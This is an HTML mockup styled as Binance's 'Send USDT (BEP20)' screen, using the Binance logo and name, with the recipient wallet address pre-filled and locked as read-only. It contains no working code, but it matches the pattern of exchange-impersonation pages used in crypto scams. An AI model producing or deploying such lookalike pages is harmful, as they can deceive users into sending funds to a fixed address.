<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Binance Style UI</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f7f7f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .container {
        background-color: #fff;
        padding: 25px;
        border-radius: 15px;
        width: 350px;
        box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
    }

    .logo {
        display: flex;
        align-items: center;
        margin-bottom: 10px;
    }

    .logo img {
        width: 30px;
        height: 30px;
        margin-right: 8px;
    }

    .logo-text {
        font-size: 20px;
        font-weight: bold;
    }

    .subtitle {
        font-size: 14px;
        color: #000; /* Dark black color as requested */
        margin-bottom: 20px;
    }

    .form-group {
        margin-bottom: 15px;
    }

    label {
        font-size: 14px;
        display: block;
        margin-bottom: 5px;
        color: #333;
    }

    input {
        width: 100%;
        padding: 10px;
        font-size: 14px;
        border: 1px solid #ccc;
        border-radius: 8px;
        outline: none;
    }

    .max-btn {
        position: absolute;
        right: 15px;
        top: 36px;
        background-color: transparent;
        border: none;
        color: #f0b90b;
        font-weight: bold;
        cursor: pointer;
    }

    .input-wrapper {
        position: relative;
    }

    .next-btn {
        width: 100%;
        padding: 12px;
        font-size: 16px;
        background-color: #f0b90b;
        color: #000;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
    }

    .next-btn:hover {
        background-color: #d9a300;
    }
</style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo">
        <span class="logo-text">Binance</span>
    </div>
    <div class="subtitle">Send USDT (BEP20)</div>

    <div class="form-group">
        <label>Recipient Address</label>
        <input type="text" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
    </div>

    <div class="form-group">
        <label>Amount</label>
        <div class="input-wrapper">
            <input type="number" placeholder="0.00">
            <button class="max-btn">Max</button>
        </div>
    </div>

    <button class="next-btn">Next</button>
</div>

</body>
</html>
